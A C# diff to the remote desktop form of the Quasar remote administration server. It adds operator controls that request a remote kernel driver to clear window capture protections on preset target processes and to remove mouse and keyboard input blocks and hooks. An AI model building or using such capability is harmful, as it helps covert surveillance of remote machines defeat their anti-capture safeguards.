@@ -2,6 +2,7 @@
 using Quasar.Common.Enums;
 using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
+using Quasar.Server.Controls;
 using Quasar.Server.Helper;
 using Quasar.Server.Messages;
 using Quasar.Server.Networking;
@@ -9,6 +10,7 @@ using Quasar.Server.Utilities;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
+using System.Text;
 using System.Windows.Forms;
 
 namespace Quasar.Server.Forms
@@ -55,6 +57,15 @@ namespace Quasar.Server.Forms
         /// </summary>
         private static readonly Dictionary<Client, FrmRemoteDesktop> OpenedForms = new Dictionary<Client, FrmRemoteDesktop>();
 
+        private string PreferenceKey => _connectClient?.EndPoint?.ToString();
+
+        /// <summary>
+        /// Stores per-client capture preferences.
+        /// </summary>
+        private static readonly Dictionary<string, CapturePreferences> StoredCapturePreferences = new Dictionary<string, CapturePreferences>();
+
+        private static readonly object CapturePreferencesLock = new object();
+
         /// <summary>
         /// Creates a new remote desktop form for the client or gets the current open form, if there exists one already.
         /// </summary>
@@ -86,6 +97,8 @@ namespace Quasar.Server.Forms
 
             RegisterMessageHandler();
             InitializeComponent();
+            InitializeKernelControls();
+            InitializeCapturePreferences();
         }
 
         /// <summary>
@@ -109,6 +122,9 @@ namespace Quasar.Server.Forms
             _connectClient.ClientState += ClientDisconnected;
             _remoteDesktopHandler.DisplaysChanged += DisplaysChanged;
             _remoteDesktopHandler.ProgressChanged += UpdateImage;
+            _remoteDesktopHandler.DriverStatusChanged += RemoteDesktopHandlerOnDriverStatusChanged;
+            _remoteDesktopHandler.KernelUnblockCompleted += RemoteDesktopHandlerOnKernelUnblockCompleted;
+            _remoteDesktopHandler.InputUnblockCompleted += RemoteDesktopHandlerOnInputUnblockCompleted;
             MessageHandler.Register(_remoteDesktopHandler);
         }
 
@@ -120,7 +136,79 @@ namespace Quasar.Server.Forms
             MessageHandler.Unregister(_remoteDesktopHandler);
             _remoteDesktopHandler.DisplaysChanged -= DisplaysChanged;
             _remoteDesktopHandler.ProgressChanged -= UpdateImage;
+            _remoteDesktopHandler.DriverStatusChanged -= RemoteDesktopHandlerOnDriverStatusChanged;
+            _remoteDesktopHandler.KernelUnblockCompleted -= RemoteDesktopHandlerOnKernelUnblockCompleted;
+            _remoteDesktopHandler.InputUnblockCompleted -= RemoteDesktopHandlerOnInputUnblockCompleted;
             _connectClient.ClientState -= ClientDisconnected;
+        }
+
+        private void InitializeKernelControls()
+        {
+            cbKernelTargets.Items.Clear();
+            foreach (var processName in KernelUnblockPresets.ProcessNames)
+            {
+                cbKernelTargets.Items.Add(processName);
+            }
+
+            if (cbKernelTargets.Items.Count > 0)
+                cbKernelTargets.SelectedIndex = 0;
+
+            btnKernelUnblock.Enabled = cbKernelTargets.Items.Count > 0;
+            UpdateDriverStateLabel(null);
+            chkIncludeCursor.Checked = _remoteDesktopHandler.IncludeCursor;
+            chkForceAffinity.Checked = _remoteDesktopHandler.ForceAffinityReset;
+        }
+
+        private void InitializeCapturePreferences()
+        {
+            var prefs = ReadCapturePreferences();
+            chkIncludeCursor.Checked = prefs.IncludeCursor;
+            chkForceAffinity.Checked = prefs.ForceAffinityReset;
+            chkRequireDriver.Checked = prefs.RequireDriver;
+            _remoteDesktopHandler.IncludeCursor = prefs.IncludeCursor;
+            _remoteDesktopHandler.ForceAffinityReset = prefs.ForceAffinityReset;
+            _remoteDesktopHandler.RequireDriver = prefs.RequireDriver;
+        }
+
+        private CapturePreferences ReadCapturePreferences()
+        {
+            var key = PreferenceKey;
+            if (string.IsNullOrEmpty(key))
+                return new CapturePreferences();
+
+            lock (CapturePreferencesLock)
+            {
+                if (!StoredCapturePreferences.TryGetValue(key, out var prefs))
+                {
+                    prefs = new CapturePreferences();
+                    StoredCapturePreferences[key] = prefs;
+                }
+
+                return new CapturePreferences
+                {
+                    IncludeCursor = prefs.IncludeCursor,
+                    ForceAffinityReset = prefs.ForceAffinityReset,
+                    RequireDriver = prefs.RequireDriver
+                };
+            }
+        }
+
+        private void UpdateCapturePreferences(Action<CapturePreferences> updater)
+        {
+            var key = PreferenceKey;
+            if (string.IsNullOrEmpty(key) || updater == null)
+                return;
+
+            lock (CapturePreferencesLock)
+            {
+                if (!StoredCapturePreferences.TryGetValue(key, out var prefs))
+                {
+                    prefs = new CapturePreferences();
+                    StoredCapturePreferences[key] = prefs;
+                }
+
+                updater(prefs);
+            }
         }
 
         /// <summary>
@@ -250,6 +338,82 @@ namespace Quasar.Server.Forms
             picDesktop.UpdateImage(bmp, false);
         }
 
+        private void RemoteDesktopHandlerOnDriverStatusChanged(object sender, KernelDriverStatusResponse e)
+        {
+            UpdateDriverStateLabel(e);
+        }
+
+        private void RemoteDesktopHandlerOnKernelUnblockCompleted(object sender, KernelUnblockResult e)
+        {
+            ShowKernelUnblockResult(e);
+            _remoteDesktopHandler.RequestKernelDriverStatus(KernelDriverAction.QueryStatus, true);
+        }
+
+        private void RemoteDesktopHandlerOnInputUnblockCompleted(object sender, InputUnblockResult e)
+        {
+            if (e == null)
+            {
+                lblInputStatus.Text = "Input status: Unknown";
+                return;
+            }
+
+            lblInputStatus.Text = $"Input status: {e.ResultCode}";
+
+            var icon = e.ResultCode == InputUnblockResultCode.Success
+                ? MessageBoxIcon.Information
+                : MessageBoxIcon.Warning;
+
+            var details = new StringBuilder();
+            details.AppendLine($"Result: {e.ResultCode}");
+            details.AppendLine($"Mouse unlocked: {e.MouseUnlocked}");
+            details.AppendLine($"Keyboard unlocked: {e.KeyboardUnlocked}");
+            if (e.DurationMilliseconds > 0)
+                details.AppendLine($"Duration: {e.DurationMilliseconds} ms");
+            if (!string.IsNullOrWhiteSpace(e.Message))
+                details.AppendLine($"Details: {e.Message}");
+
+            MessageBox.Show(this, details.ToString(), "Input Unblock Result", MessageBoxButtons.OK, icon);
+        }
+
+        private void UpdateDriverStateLabel(KernelDriverStatusResponse status)
+        {
+            var state = status?.State ?? KernelDriverState.Unknown;
+            var versionSuffix = string.IsNullOrWhiteSpace(status?.Version)
+                ? string.Empty
+                : $" v{status.Version}";
+            lblKernelDriverState.Text = $"Driver: {state}{versionSuffix}";
+
+            var tooltip = status == null
+                ? "Kernel driver status unavailable."
+                : string.IsNullOrWhiteSpace(status.Message)
+                    ? (status.WatchdogActive ? "Driver watchdog active." : "Driver ready for capture.")
+                    : status.Message;
+
+            toolTipButtons.SetToolTip(lblKernelDriverState, tooltip);
+        }
+
+        private void ShowKernelUnblockResult(KernelUnblockResult result)
+        {
+            if (result == null)
+                return;
+
+            var icon = result.Result == KernelUnblockResultCode.Success
+                ? MessageBoxIcon.Information
+                : MessageBoxIcon.Warning;
+
+            var details = new StringBuilder();
+            details.AppendLine($"Process: {result.ProcessName ?? "n/a"}");
+            details.AppendLine($"Result: {result.Result}");
+            details.AppendLine($"Windows cleared: {result.WindowsUpdated}");
+            details.AppendLine($"Processes scanned: {result.ProcessesInspected}");
+            if (result.ElapsedMilliseconds > 0)
+                details.AppendLine($"Duration: {result.ElapsedMilliseconds} ms");
+            if (!string.IsNullOrWhiteSpace(result.Message))
+                details.AppendLine($"Details: {result.Message}");
+
+            MessageBox.Show(this, details.ToString(), "Kernel Unblock Result", MessageBoxButtons.OK, icon);
+        }
+
         private void FrmRemoteDesktop_Load(object sender, EventArgs e)
         {
             this.Text = WindowHelper.GetWindowTitle("Remote Desktop", _connectClient);
@@ -257,6 +421,7 @@ namespace Quasar.Server.Forms
             OnResize(EventArgs.Empty); // trigger resize event to align controls 
 
             _remoteDesktopHandler.RefreshDisplays();
+            _remoteDesktopHandler.RequestKernelDriverStatus();
         }
 
         /// <summary>
@@ -306,6 +471,85 @@ namespace Quasar.Server.Forms
         {
             UnsubscribeEvents();
             StopStream();
+        }
+
+        private void btnKernelUnblock_Click(object sender, EventArgs e)
+        {
+            if (cbKernelTargets.SelectedItem == null)
+            {
+                MessageBox.Show(this, "Select the process you would like to unblock.", "Kernel Unblock",
+                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            string processName = cbKernelTargets.SelectedItem.ToString();
+
+            try
+            {
+                _remoteDesktopHandler.SendKernelUnblock(
+                    processName,
+                    includeChildren: true,
+                    requireDriver: chkRequireDriver.Checked,
+                    forceResetAffinity: chkForceAffinity.Checked,
+                    driverAction: KernelDriverAction.EnsureRunning,
+                    force: false);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(this, $"Failed to send kernel unblock request: {ex.Message}", "Kernel Unblock",
+                    MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private void btnRefreshDriverStatus_Click(object sender, EventArgs e)
+        {
+            _remoteDesktopHandler.RequestKernelDriverStatus(KernelDriverAction.QueryStatus, true);
+        }
+
+        private void btnInputUnblock_Click(object sender, EventArgs e)
+        {
+            bool targetMouse = chkInputMouse.Checked;
+            bool targetKeyboard = chkInputKeyboard.Checked;
+
+            if (!targetMouse && !targetKeyboard)
+            {
+                MessageBox.Show(this, "Select at least one input path to unblock.", "Input Unblock",
+                    MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            lblInputStatus.Text = "Input status: pending...";
+            try
+            {
+                _remoteDesktopHandler.SendInputUnblock(targetMouse, targetKeyboard, forceBlockReset: true, forceHookCleanup: true);
+            }
+            catch (Exception ex)
+            {
+                lblInputStatus.Text = "Input status: request failed.";
+                MessageBox.Show(this, $"Failed to send input unblock request: {ex.Message}", "Input Unblock",
+                    MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private void chkIncludeCursor_CheckedChanged(object sender, EventArgs e)
+        {
+            bool includeCursor = chkIncludeCursor.Checked;
+            _remoteDesktopHandler.IncludeCursor = includeCursor;
+            UpdateCapturePreferences(p => p.IncludeCursor = includeCursor);
+        }
+
+        private void chkForceAffinity_CheckedChanged(object sender, EventArgs e)
+        {
+            bool force = chkForceAffinity.Checked;
+            _remoteDesktopHandler.ForceAffinityReset = force;
+            UpdateCapturePreferences(p => p.ForceAffinityReset = force);
+        }
+
+        private void chkRequireDriver_CheckedChanged(object sender, EventArgs e)
+        {
+            bool require = chkRequireDriver.Checked;
+            _remoteDesktopHandler.RequireDriver = require;
+            UpdateCapturePreferences(p => p.RequireDriver = require);
         }
 
         #region Remote Desktop Input
@@ -470,6 +714,13 @@ namespace Quasar.Server.Forms
         private void btnShow_Click(object sender, EventArgs e)
         {
             TogglePanelVisibility(true);
+        }
+
+        private sealed class CapturePreferences
+        {
+            public bool IncludeCursor { get; set; } = true;
+            public bool ForceAffinityReset { get; set; }
+            public bool RequireDriver { get; set; } = true;
         }
     }
 }
